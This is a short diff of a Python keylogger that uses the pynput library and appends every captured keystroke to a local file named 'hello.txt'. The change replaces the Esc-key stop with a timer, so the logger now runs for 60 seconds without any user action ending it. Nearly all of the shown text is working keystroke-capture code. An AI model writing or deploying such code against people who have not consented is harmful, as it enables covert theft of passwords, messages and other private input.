@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener, Key
+from datetime import datetime, timedelta
 
 special_keys = {
     "Key.alt": "[alt]",
@@ -60,11 +61,12 @@ def on_press(key):
     with open("hello.txt", "a") as f:
         f.write(listen)
 
+stat = datetime.now()
+end = stat + timedelta(seconds=60)
 def on_release(key):
-    if str(key) == "Key.esc":
+    if datetime.now() >=  end:
         return False
     return None
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
